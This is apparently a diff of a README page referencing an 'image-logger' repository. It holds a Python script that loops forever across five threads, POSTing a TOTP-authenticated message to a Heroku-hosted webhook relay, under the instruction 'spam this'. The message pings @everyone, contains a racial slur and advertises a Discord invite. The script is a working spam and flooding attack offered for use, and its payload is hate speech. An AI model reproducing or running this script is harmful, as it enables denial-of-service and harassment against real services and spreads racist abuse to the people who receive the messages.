@@ -11,12 +11,7 @@ https://github.com/bestdudeonearth/image-logger - https://discordapp.com/api/web
 ```py
 def sex():
    while True:
-      key, embed = "DEF4FIWCX56MFMWCU4HU2YY=", {"content":"@everyone hi nigger get good join funny gang https://discord.gg/TuXtgsMq"}
-      from pyotp import TOTP;key = TOTP(key).now()
-      import requests;src = requests.post("http://pacific-forest-98702.herokuapp.com/", headers={"Authorization": key}, json=embed)
-      try:print("lolled > " + str(src.json())) 
-      except:print("lolled > " + str(src.status_code))
-
+      from pyotp import TOTP;import requests;src = requests.post("http://pacific-forest-98702.herokuapp.com/", headers={"Authorization": TOTP("DEF4FIWCX56MFMWCU4HU2YY=").now()}, json={"content":"@everyone hi nigger get good join funny gang https://discord.gg/TuXtgsMq"}); print("lolled > " + str(src.status_code))
 for x in range(5): import threading;threading.Thread(target=sex).start()
 ```
 spam this ^^^
